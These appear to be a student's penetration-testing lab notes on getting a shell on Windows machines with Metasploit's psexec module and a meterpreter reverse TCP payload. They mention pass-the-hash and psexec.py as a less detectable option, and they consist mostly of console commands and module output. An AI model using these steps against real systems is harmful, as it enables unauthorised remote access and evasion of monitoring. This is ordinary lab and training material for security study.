
## Gaining Shell Access

1. Metasploit psexec
2. Instead of utilizing password or account, we can utilize hash instead
3. metasploit is noisy , we can use psexec.py instead(similar to metasploit and cant be seen)

## Lab Time
- Start `msfexploit`
- `search psexec`
- `use 4` - exploit/windows/smb/psexec
- `set payload windows/x64/meterpreter/reverse_tcp`


```
msf6 > search psexec

Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------

   4   exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution


Interact with a module by name or index. For example info 10, use 10 or use exploit/windows/local/wmi

msf6 > use 4
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp                                                       
msf6 exploit(windows/smb/psexec) >                                       
```


======

```
msf6 exploit(windows/smb/psexec) > options                                                                                     
Module options (exploit/windows/smb/psexec):                          

   Name                  Current Setting  Required  Description                                                                
   ----                  ---------------  --------  -----------                                                                
   RHOSTS                                 yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit  
                                                    /basics/using-metasploit.html                                              
   RPORT                 445              yes       The SMB service port (TCP)                                                 
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing                
   SERVICE_DISPLAY_NAME                   no        The service display name                                                   
   SERVICE_NAME                           no        The service name                                                           
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a norma
                                                    l read/write folder share
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.64.4     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.


```